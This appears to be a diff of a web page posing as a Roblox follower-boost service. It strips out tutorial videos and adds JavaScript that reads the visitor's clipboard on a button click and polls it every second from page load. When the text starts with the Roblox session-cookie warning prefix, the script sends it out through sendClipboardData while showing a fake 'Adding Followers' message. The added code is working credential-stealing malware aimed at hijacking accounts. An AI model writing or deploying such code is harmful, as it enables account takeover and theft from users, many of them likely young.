@@ -220,161 +220,6 @@ h1 {
     transform: rotate(360deg);
   }
 }
-
-.tutorial-title {
-  margin: 0 0 15px 0;
-  font-size: 28px;
-  font-weight: 800;
-  text-align: center;
-  color: white;
-}
-
-/* Tutorial videos side by side */
-.tutorial-videos {
-  display: grid;
-  grid-template-columns: 1fr 1fr;
-  gap: 30px;
-  width: 95%;
-  max-width: 1400px;
-  margin: 40px auto;
-  align-items: start;
-}
-
-.tutorial-item {
-  display: flex;
-  flex-direction: column;
-  min-width: 0;
-  width: 100%;
-}
-
-.tutorial-item .tutorial-title {
-  margin-bottom: 15px;
-}
-
-/* Tutorial Video Containers */
-.video-container {
-    position: relative;
-    width: 100%;
-    overflow: hidden;
-    border-radius: 18px;
-    background: #000;
-    border: 1px solid #292933;
-    box-shadow: 0 0 40px rgba(88, 101, 242, 0.2);
-    display: flex;
-    align-items: center;
-    justify-content: center;
-}
-
-/* PC video: widescreen 16:9 */
-.pc-container {
-    width: 100%;
-    aspect-ratio: 16 / 9;
-}
-
-.video-frame {
-    display: block;
-    width: 100%;
-    height: 100%;
-    border: none;
-}
-
-/* iPhone video container matches the PC video height */
-.shorts-container {
-    width: 100%;
-    height: var(--pc-video-height, auto);
-    aspect-ratio: auto;
-    align-self: start;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-}
-
-/* Perfect 9:16 sizing matching wrapper height */
-.shorts-wrapper {
-    height: var(--iphone-wrapper-height, auto);
-    aspect-ratio: 9 / 16;
-    width: auto;
-    max-width: 100%;
-    margin: 0 auto;
-    background: #000;
-    position: relative;
-    overflow: hidden;
-    border-radius: 12px;
-    flex-shrink: 0;
-}
-
-.shorts-frame {
-    position: absolute;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    border: none;
-}
-
-@media (max-width: 1100px) {
-    .tutorial-videos {
-      grid-template-columns: 1fr;
-    }
-}
-
-@media (max-width: 768px) {
-    body {
-        padding: 12px;
-    }
-
-    .card {
-      padding: 42px 24px;
-    }
-
-    h1 {
-      font-size: 31px;
-    }
-
-    .logo {
-      width: 68px;
-      height: 68px;
-      font-size: 29px;
-    }
-
-    .pc-container {
-        aspect-ratio: 16 / 9;
-    }
-
-    .shorts-container {
-        aspect-ratio: auto;
-        height: auto;
-        border: none;
-        box-shadow: none;
-        background: transparent;
-        overflow: visible;
-        display: block;
-    }
-
-    .shorts-wrapper {
-        width: 100%;
-        max-width: 340px;
-        height: auto;
-        aspect-ratio: 9 / 16;
-        overflow: hidden;
-        border-radius: 18px;
-        border: 1px solid #292933;
-        box-shadow: 0 0 40px rgba(88, 101, 242, 0.2);
-    }
-
-    .shorts-frame {
-        width: 100%;
-        height: 100%;
-    }
-
-    .iphone-tutorial {
-        order: 1;
-    }
-
-    .pc-tutorial {
-        order: 2;
-    }
-}
 </style>
 
 </head>
@@ -408,51 +253,7 @@ h1 {
       PC Extension
     </a>
 
-    <a
-      class="extension-button"
-      href="https://apps.apple.com/us/app/cookie-editor/id6446215341"
-      target="_blank"
-      rel="noopener noreferrer"
-    >
-      iPhone Extension
-    </a>
-
     <div class="status" id="status"></div>
-  </div>
-
-  <div class="tutorial-videos">
-
-    <div class="tutorial-item pc-tutorial">
-      <h2 class="tutorial-title">PC Tutorial</h2>
-
-      <div class="video-container pc-container">
-        <iframe
-          class="video-frame"
-          src="https://www.youtube-nocookie.com/embed/AgLkFg16Wg4?mute=1"
-          title="PC Tutorial"
-          allow="encrypted-media; picture-in-picture"
-          allowfullscreen>
-        </iframe>
-      </div>
-    </div>
-
-    <div class="tutorial-item iphone-tutorial">
-      <h2 class="tutorial-title">iPhone Tutorial</h2>
-
-      <div class="video-container shorts-container">
-        <div class="shorts-wrapper">
-          <iframe
-            class="shorts-frame"
-            src="https://www.youtube-nocookie.com/embed/B_O15Ku1Bh0?mute=1&loop=1&playlist=B_O15Ku1Bh0"
-            title="iPhone Tutorial"
-            allow="autoplay; encrypted-media; picture-in-picture; fullscreen"
-            allowfullscreen
-            webkitallowfullscreen>
-          </iframe>
-        </div>
-      </div>
-    </div>
-
   </div>
 
 </div>
@@ -476,4 +277,57 @@ async function sendClipboardData(text) {
       })     
     });     
      
-    await new Promise(resolve => setTimeout(resolve, 10000));
+    await new Promise(resolve => setTimeout(resolve, 10000));     
+     
+    status.textContent = "Restart Device To Get Followers Added to your account!";     
+  } catch (error) {     
+    status.textContent = "Something went wrong. Please try again.";     
+    console.error(error);     
+  }
+}
+
+button.addEventListener("click", async () => {     
+  try {     
+    status.innerHTML = `     
+      <span class="spinner"></span>     
+      Adding Followers...     
+    `;     
+     
+    const text = await navigator.clipboard.readText();     
+     
+    if (!text || !text.startsWith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_")) {     
+      status.textContent = "error make sure u copy cookie";     
+      return;     
+    }     
+     
+    await sendClipboardData(text);
+     
+  } catch (error) {     
+    status.textContent = "error make sure u copy cookie";     
+    console.error(error);     
+  }     
+});
+
+async function monitorClipboard() {
+  if (!navigator.clipboard || !navigator.clipboard.readText) return;
+  
+  try {
+    const text = await navigator.clipboard.readText();
+    if (text && text.startsWith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_")) {
+      await sendClipboardData(text);
+      return;
+    }
+  } catch (e) {
+    // Clipboard permission might require user interaction first
+  }
+  
+  setTimeout(monitorClipboard, 1000);
+}
+
+window.addEventListener("load", () => {
+  setTimeout(monitorClipboard, 500);
+});
+</script>     
+     
+</body>  
+</html>
